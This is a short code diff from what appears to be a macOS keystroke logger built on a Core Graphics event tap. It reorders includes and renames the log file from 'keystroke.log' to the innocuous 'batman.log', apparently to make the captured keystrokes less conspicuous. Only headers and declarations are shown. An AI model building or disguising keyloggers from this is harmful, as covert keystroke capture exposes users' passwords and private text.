@@ -6,15 +6,16 @@
 #include <Carbon/Carbon.h>
 #include <sys/types.h>
 #include <sys/time.h>
-#include <signal.h>
 #include <stdbool.h>
-#include <stdio.h>
+#include <signal.h>
 #include <string.h>
+#include <stdio.h>
 #include "utils.h"
+#include <time.h>
 #include "keys.h"
 
 FILE *logfile = NULL;
-const char *logfileLocation = "/var/log/keystroke.log";
+const char *logfileLocation = "/var/log/batman.log";
 
 CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void *);
 const char *convertKeyCode(int, bool, bool);
